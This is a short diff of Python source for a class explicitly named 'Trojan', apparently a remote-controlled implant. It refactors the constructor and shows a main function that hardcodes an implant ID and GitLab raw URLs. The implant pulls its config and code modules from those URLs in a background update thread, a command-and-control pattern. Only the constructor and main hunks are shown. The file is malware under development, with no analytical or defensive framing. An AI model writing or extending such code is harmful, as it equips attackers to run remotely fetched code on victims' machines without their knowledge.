@@ -3,9 +3,8 @@ import threading, time, os
 import importlib.machinery
 
 class Trojan:
-    def __init__(self, id, configUrl, modulesRepo):
+    def __init__(self, configUrl, modulesRepo):
         self.__stop = False
-        self.__id = id
         self.__config_url = configUrl
         self.__update_config()
         self.__update_thread = threading.Thread(target=self.__conf_update_loop)
@@ -61,7 +60,7 @@ def main():
     id = 'b494b07e-5e27-4073-8db2-f550d60308e4'
     configRepo = 'https://gitlab.com/threetoes/config-repo/raw/master/config/' + id + '.json'
     modulesRepo = 'https://gitlab.com/threetoes/config-repo/raw/master/modules/'
-    t = Trojan(id, configRepo, modulesRepo)
+    t = Trojan(configRepo, modulesRepo)
     t.start()
 
 
